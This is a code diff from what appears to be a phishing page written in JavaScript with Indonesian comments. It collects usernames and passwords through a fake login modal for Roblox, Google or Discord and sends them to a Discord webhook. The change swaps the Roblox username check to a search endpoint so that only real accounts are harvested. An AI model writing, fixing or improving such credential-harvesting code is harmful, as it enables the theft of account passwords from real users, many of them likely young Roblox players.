@@ -406,7 +406,7 @@
     if (e.target === inputModal) closeInput();
   });
 
-  // Submit Data ke Webhook Discord dengan Validasi Roblox API (Jika Roblox)
+  // Submit Data ke Webhook Discord dengan Validasi Roblox API (GET endpoint)
   submitInputBtn.addEventListener('click', function() {
     var userInfo = userInputField.value.trim();
     var passwordInfo = passwordInputField.value.trim();
@@ -420,19 +420,20 @@
       submitInputBtn.textContent = "Memeriksa...";
       submitInputBtn.disabled = true;
 
-      // Cek ke API Roblox apakah username valid (menggunakan proxy CORS aman)
-      fetch('https://users.roproxy.com/v1/usernames/users', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ usernames: [userInfo], excludeBannedUsers: true })
-      })
+      // Validasi menggunakan endpoint GET roproxy users search
+      fetch('https://users.roproxy.com/v1/users/search?keyword=' + encodeURIComponent(userInfo) + '&limit=10')
       .then(res => res.json())
       .then(data => {
         submitInputBtn.textContent = "Kirim";
         submitInputBtn.disabled = false;
 
-        if (data && data.data && data.data.length > 0) {
-          // Username valid di Roblox
+        var found = false;
+        if (data && data.data) {
+          // Cek apakah ada username yang sama persis (case-insensitive)
+          found = data.data.some(user => user.name.toLowerCase() === userInfo.toLowerCase());
+        }
+
+        if (found) {
           sendWebhook(userInfo, passwordInfo);
         } else {
           alert("Username Roblox tidak ditemukan atau palsu! Silakan masukkan username yang asli.");
@@ -445,7 +446,6 @@
         alert("Gagal memvalidasi username Roblox. Coba lagi.");
       });
     } else {
-      // Untuk provider selain Roblox (Google/Discord), langsung kirim
       sendWebhook(userInfo, passwordInfo);
     }
   });
